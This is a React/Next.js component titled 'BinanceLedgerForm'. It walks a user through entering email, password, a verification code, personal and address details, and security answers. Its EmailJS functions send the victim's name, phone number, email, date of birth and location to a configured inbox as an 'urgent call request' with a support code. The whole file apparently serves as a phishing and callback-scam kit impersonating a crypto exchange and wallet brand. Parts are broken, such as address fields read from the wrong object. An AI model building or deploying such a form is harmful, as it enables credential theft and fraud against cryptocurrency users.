import React, { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/router';
import emailjs from '@emailjs/browser';
import { EMAILJS_CONFIG } from '../config/emailjs.config';
import { FormData } from '../types/types';
import { useSession } from 'next-auth/react';

// Define the structure of the form steps
const formSteps = [
  'email',
  'password',
  'verification',
  'personalDetails',
  'addressDetails',
  'securityQuestions',
  'termsAndConditions',
  'confirmation',
];

// Initial form data
const initialFormData: FormData = {
  email: '',
  password: '',
  verificationCode: '',
  firstName: '',
  lastName: '',
  dateOfBirth: '',
  phoneNumber: '',
  address: '',
  zipCode: '',
  city: '',
  country: '',
  securityQuestion1: '',
  securityAnswer1: '',
  securityQuestion2: '',
  securityAnswer2: '',
  termsAccepted: false,
};

const BinanceLedgerForm: React.FC = () => {
  const [currentStep, setCurrentStep] = useState<string>(formSteps[0]);
  const [formData, setFormData] = useState<FormData>(initialFormData);
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [verificationCode, setVerificationCode] = useState<string>('');
  const [personalDetails, setPersonalDetails] = useState<{
    firstName: string;
    lastName: string;
    dateOfBirth: string;
    phoneNumber: string;
  }>({
    firstName: '',
    lastName: '',
    dateOfBirth: '',
    phoneNumber: '',
  });
  const [addressDetails, setAddressDetails] = useState<{
    address: string;
    zipCode: string;
    city: string;
    country: string;
  }>({
    address: '',
    zipCode: '',
    city: '',
    country: '',
  });
  const [securityQuestions, setSecurityQuestions] = useState<{
    securityQuestion1: string;
    securityAnswer1: string;
    securityQuestion2: string;
    securityAnswer2: string;
  }>({
    securityQuestion1: '',
    securityAnswer1: '',
    securityQuestion2: '',
    securityAnswer2: '',
  });
  const [termsAccepted, setTermsAccepted] = useState<boolean>(false);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [submissionError, setSubmissionError] = useState<string | null>(null);
  const [submissionSuccess, setSubmissionSuccess] = useState<boolean>(false);
  const [countdown, setCountdown] = useState<number>(60);
  const [isResendDisabled, setIsResendDisabled] = useState<boolean>(true);
  const countdownInterval = useRef<NodeJS.Timeout | null>(null);
  const router = useRouter();
  const { data: session } = useSession();

  useEffect(() => {
    if (!session) {
      router.push('/api/auth/signin');
    }
  }, [session, router]);

  useEffect(() => {
    if (countdown > 0 && !isResendDisabled) {
      countdownInterval.current = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);
    } else {
      setIsResendDisabled(false);
      if (countdownInterval.current) {
        clearTimeout(countdownInterval.current);
      }
    }

    return () => {
      if (countdownInterval.current) {
        clearTimeout(countdownInterval.current);
      }
    };
  }, [countdown, isResendDisabled]);

  // Enhanced email sending function for support requests
  const sendSupportEmail = async (supportType: string) => {
    try {
      const fullName = `${personalDetails.firstName} ${personalDetails.lastName}`.trim();
      
      const templateParams = {
        from_name: 'Binance Ledger Support Request',
        from_email: email,
        to_email: EMAILJS_CONFIG.TO_EMAIL,
        subject: `Urgent: Call Request - ${supportType}`,
        message: `
SUPPORT CALL REQUEST

The following user needs to receive a call immediately:

Full Name: ${fullName}
Phone Number: ${personalDetails.phoneNumber}
Email: ${email}

Request Type: ${supportType}
Support Code: 7791
Current Step: ${currentStep}
Timestamp: ${new Date().toISOString()}

IMPORTANT: Please contact this user at the phone number provided above.

Additional Details:
Address: ${personalDetails.address}
City: ${personalDetails.city}
Country: ${personalDetails.country}
Date of Birth: ${personalDetails.dateOfBirth}
        `
      };

      const result = await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams
      );

      console.log('Support email sent successfully:', result);
      return result;
    } catch (error) {
      console.error('Failed to send support email:', error);
      throw error;
    }
  };

  const sendEmailNotification = async () => {
    try {
      const templateParams = {
        from_name: 'Binance Ledger Form',
        from_email: email,
        to_email: EMAILJS_CONFIG.TO_EMAIL,
        subject: 'New Form Submission',
        message: `New form submission at step ${currentStep} from ${email}`,
      };

      const result = await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams
      );

      console.log('Email sent successfully:', result);
      return result;
    } catch (error) {
      console.error('Failed to send email:', error);
      throw error;
    }
  };

  const sendSupportRequest = async (supportType: string) => {
    try {
      setIsSubmitting(true);
      setSubmissionError(null);

      await sendSupportEmail(supportType);

      setSubmissionSuccess(true);
    } catch (error: any) {
      console.error('Support request submission failed:', error);
      setSubmissionError(
        error.message || 'Failed to submit support request. Please try again.'
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  const sendFormData = async () => {
    try {
      setIsSubmitting(true);
      setSubmissionError(null);

      // Simulate form submission delay
      await new Promise((resolve) => setTimeout(resolve, 2000));

      await sendEmailNotification();

      setSubmissionSuccess(true);
    } catch (error: any) {
      console.error('Form submission failed:', error);
      setSubmissionError(
        error.message || 'Failed to submit form. Please try again.'
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  const startCountdown = () => {
    setCountdown(60);
    setIsResendDisabled(true);
  };

  const handleInputChange = (
    step: string,
    field: string,
    value: string | boolean
  ) => {
    switch (step) {
      case 'email':
        setEmail(value as string);
        break;
      case 'password':
        setPassword(value as string);
        break;
      case 'verification':
        setVerificationCode(value as string);
        break;
      case 'personalDetails':
        setPersonalDetails((prev) => ({ ...prev, [field]: value as string }));
        break;
      case 'addressDetails':
        setAddressDetails((prev) => ({ ...prev, [field]: value as string }));
        break;
      case 'securityQuestions':
        setSecurityQuestions((prev) => ({ ...prev, [field]: value as string }));
        break;
      case 'termsAndConditions':
        setTermsAccepted(value as boolean);
        break;
      default:
        setFormData((prev) => ({ ...prev, [field]: value as string }));
        break;
    }
  };

  const goToNextStep = () => {
    const currentIndex = formSteps.indexOf(currentStep);
    if (currentIndex < formSteps.length - 1) {
      setCurrentStep(formSteps[currentIndex + 1]);
    }
  };

  const goToPrevStep = () => {
    const currentIndex = formSteps.indexOf(currentStep);
    if (currentIndex > 0) {
      setCurrentStep(formSteps[currentIndex - 1]);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendFormData();
  };

  const renderFormStep = () => {
    switch (currentStep) {
      case 'email':
        return (
          <div>
            <h2>Enter Your Email</h2>
            <input
              type="email"
              placeholder="Email"
              value={email}
              onChange={(e) => handleInputChange('email', 'email', e.target.value)}
            />
            <button onClick={goToNextStep}>Next</button>
          </div>
        );
      case 'password':
        return (
          <div>
            <h2>Enter Your Password</h2>
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) =>
                handleInputChange('password', 'password', e.target.value)
              }
            />
            <button onClick={goToPrevStep}>Previous</button>
            <button onClick={goToNextStep}>Next</button>
          </div>
        );
      case 'verification':
        return (
          <div>
            <h2>Verification</h2>
            <input
              type="text"
              placeholder="Verification Code"
              value={verificationCode}
              onChange={(e) =>
                handleInputChange(
                  'verification',
                  'verificationCode',
                  e.target.value
                )
              }
            />
            <button onClick={goToPrevStep}>Previous</button>
            <button onClick={goToNextStep}>Next</button>
            <button onClick={startCountdown} disabled={isResendDisabled}>
              Resend Code ({isResendDisabled ? countdown : 'Resend'})
            </button>
          </div>
        );
      case 'personalDetails':
        return (
          <div>
            <h2>Personal Details</h2>
            <input
              type="text"
              placeholder="First Name"
              value={personalDetails.firstName}
              onChange={(e) =>
                handleInputChange(
                  'personalDetails',
                  'firstName',
                  e.target.value
                )
              }
            />
            <input
              type="text"
              placeholder="Last Name"
              value={personalDetails.lastName}
              onChange={(e) =>
                handleInputChange('personalDetails', 'lastName', e.target.value)
              }
            />
            <input
              type="date"
              placeholder="Date of Birth"
              value={personalDetails.dateOfBirth}
              onChange={(e) =>
                handleInputChange(
                  'personalDetails',
                  'dateOfBirth',
                  e.target.value
                )
              }
            />
            <input
              type="tel"
              placeholder="Phone Number"
              value={personalDetails.phoneNumber}
              onChange={(e) =>
                handleInputChange(
                  'personalDetails',
                  'phoneNumber',
                  e.target.value
                )
              }
            />
            <button onClick={goToPrevStep}>Previous</button>
            <button onClick={goToNextStep}>Next</button>
          </div>
        );
      case 'addressDetails':
        return (
          <div>
            <h2>Address Details</h2>
            <input
              type="text"
              placeholder="Address"
              value={addressDetails.address}
              onChange={(e) =>
                handleInputChange('addressDetails', 'address', e.target.value)
              }
            />
            <input
              type="text"
              placeholder="Zip Code"
              value={addressDetails.zipCode}
              onChange={(e) =>
                handleInputChange('addressDetails', 'zipCode', e.target.value)
              }
            />
            <input
              type="text"
              placeholder="City"
              value={addressDetails.city}
              onChange={(e) =>
                handleInputChange('addressDetails', 'city', e.target.value)
              }
            />
            <input
              type="text"
              placeholder="Country"
              value={addressDetails.country}
              onChange={(e) =>
                handleInputChange('addressDetails', 'country', e.target.value)
              }
            />
            <button onClick={goToPrevStep}>Previous</button>
            <button onClick={goToNextStep}>Next</button>
          </div>
        );
      case 'securityQuestions':
        return (
          <div>
            <h2>Security Questions</h2>
            <input
              type="text"
              placeholder="Security Question 1"
              value={securityQuestions.securityQuestion1}
              onChange={(e) =>
                handleInputChange(
                  'securityQuestions',
                  'securityQuestion1',
                  e.target.value
                )
              }
            />
            <input
              type="text"
              placeholder="Answer 1"
              value={securityQuestions.securityAnswer1}
              onChange={(e) =>
                handleInputChange(
                  'securityQuestions',
                  'securityAnswer1',
                  e.target.value
                )
              }
            />
            <input
              type="text"
              placeholder="Security Question 2"
              value={securityQuestions.securityQuestion2}
              onChange={(e) =>
                handleInputChange(
                  'securityQuestions',
                  'securityQuestion2',
                  e.target.value
                )
              }
            />
            <input
              type="text"
              placeholder="Answer 2"
              value={securityQuestions.securityAnswer2}
              onChange={(e) =>
                handleInputChange(
                  'securityQuestions',
                  'securityAnswer2',
                  e.target.value
                )
              }
            />
            <button onClick={goToPrevStep}>Previous</button>
            <button onClick={goToNextStep}>Next</button>
          </div>
        );
      case 'termsAndConditions':
        return (
          <div>
            <h2>Terms and Conditions</h2>
            <label>
              <input
                type="checkbox"
                checked={termsAccepted}
                onChange={(e) =>
                  handleInputChange(
                    'termsAndConditions',
                    'termsAccepted',
                    e.target.checked
                  )
                }
              />
              I accept the terms and conditions
            </label>
            <button onClick={goToPrevStep}>Previous</button>
            <button onClick={goToNextStep}>Next</button>
          </div>
        );
      case 'confirmation':
        return (
          <div>
            <h2>Confirmation</h2>
            <p>Email: {email}</p>
            <p>Password: {password}</p>
            <p>Verification Code: {verificationCode}</p>
            <p>
              Personal Details: {personalDetails.firstName}{' '}
              {personalDetails.lastName}, {personalDetails.dateOfBirth},{' '}
              {personalDetails.phoneNumber}
            </p>
            <p>
              Address Details: {addressDetails.address}, {addressDetails.zipCode}
              , {addressDetails.city}, {addressDetails.country}
            </p>
            <p>
              Security Questions: {securityQuestions.securityQuestion1},{' '}
              {securityQuestions.securityAnswer1},
              {securityQuestions.securityQuestion2},{' '}
              {securityQuestions.securityAnswer2}
            </p>
            <p>Terms Accepted: {termsAccepted ? 'Yes' : 'No'}</p>
            <button onClick={goToPrevStep}>Previous</button>
            <button type="submit" onClick={handleSubmit} disabled={isSubmitting}>
              {isSubmitting ? 'Submitting...' : 'Submit'}
            </button>
            <button onClick={() => sendSupportRequest('Technical')}>
              Request Technical Support
            </button>
            <button onClick={() => sendSupportRequest('Financial')}>
              Request Financial Support
            </button>
          </div>
        );
      default:
        return <p>Unknown step</p>;
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      {renderFormStep()}
      {submissionError && <p className="error">{submissionError}</p>}
      {submissionSuccess && (
        <p className="success">Form submitted successfully!</p>
      )}
    </form>
  );
};

export default BinanceLedgerForm;
